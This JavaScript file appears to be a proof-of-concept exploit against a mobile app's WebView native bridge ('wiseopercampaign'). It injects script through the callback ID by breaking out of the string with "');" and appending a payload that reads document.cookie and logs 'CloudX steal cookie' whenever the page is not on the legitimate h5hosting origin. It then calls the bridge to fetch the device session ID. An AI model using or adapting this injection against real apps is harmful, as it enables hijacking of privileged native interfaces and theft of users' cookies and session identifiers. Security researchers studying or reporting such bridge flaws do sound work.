(() => {
    "use strict";
    let callbackIdSeed = Math.floor(2e9 * Math.random());
    const genCallbackId = () => callbackIdSeed++;

    // 回调缓存与消息队列（核心依赖）
    const callbackCache = {};
    const messageQueue = [];
    const microTask = typeof Promise !== "undefined"
        ? (cb) => Promise.resolve().then(cb)
        : (cb) => setTimeout(cb);

    // 状态码（仅保留invoke函数需要的取消状态）
    const STATUS = {CANCEL: 9};

    // ========================= 核心函数：callNativeMethod（保留核心逻辑） =========================
    const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
        args = args || [];
        args.forEach((arg, idx) => {
            if (Object.prototype.toString.call(arg).slice(8, -1) === 'ArrayBuffer') {
                args[idx] = btoa(arg);
            }
        });
        // const callbackId = `${service}${genCallbackId()}`;


        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
        const callbackId = `${service}${genCallbackId()}');${payload}//`;

        if (success || fail) callbackCache[callbackId] = {success, fail};
        const nativeBridge = window[bridgeName]
        const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
        if (result) messageQueue.push(result);
        microTask(() => {
            if (messageQueue.length === 0) return;
            const rawMsg = messageQueue.shift();
            const sep = rawMsg.indexOf(" ");
            const content = rawMsg.substring(sep + 1);
            // 极简解析：仅处理成功/失败回调
            const isSuccess = content.charAt(0) === 'S';
            const cbIdSep = content.indexOf(" ", 3);
            const cbId = content.slice(3, cbIdSep);
            const cb = callbackCache[cbId];
            if (cb) {
                const args = content.slice(cbIdSep + 1);
                isSuccess ? cb.success?.(args) : cb.fail?.(args);
                delete callbackCache[cbId]; // 执行后删除回调
            }
        });
    };

    const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
        const hasCallback = success || fail || cancel || complete;
        // 包装成功回调
        const wrapSuccess = hasCallback ? (res) => {
            success && success(res);
            complete && complete(res);
        } : null;
        const wrapFail = hasCallback ? (res, status) => {
            status === STATUS.CANCEL && cancel ? cancel(res) : (fail && fail(res, status));
            complete && complete(res, status);
        } : null;
        callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
    };
    const init = (apiName) => {
        window[apiName] = window[apiName] || {};
        // window[apiName].callbackFromNative = () => {
        // };
        
        window[apiName].callbackFromNative = (callbackId, isSuccess, status, args) => {
            console.info(`回调ID: ${callbackId}, 成功: ${isSuccess}, 状态: ${status}, 参数: ${JSON.stringify(args)}`);
            const cb = callbackCache[callbackId];
            if (cb) {
                isSuccess ? cb.success?.(args) : cb.fail?.(args, status);
                delete callbackCache[callbackId];
            }
        };
    };

    window.nativeBridge = {init, invoke, callNativeMethod};
    nativeBridge.init("wiseopercampaign");
    nativeBridge.invoke(
        "wiseopercampaignbridge",
        "app",
        "getDeviceSessionId",
        [false],
        (res) => console.log("cloudx succeed：", JSON.stringify(res)),
        (err) => console.log("cloudx error：", JSON.stringify(err))
    );
})();
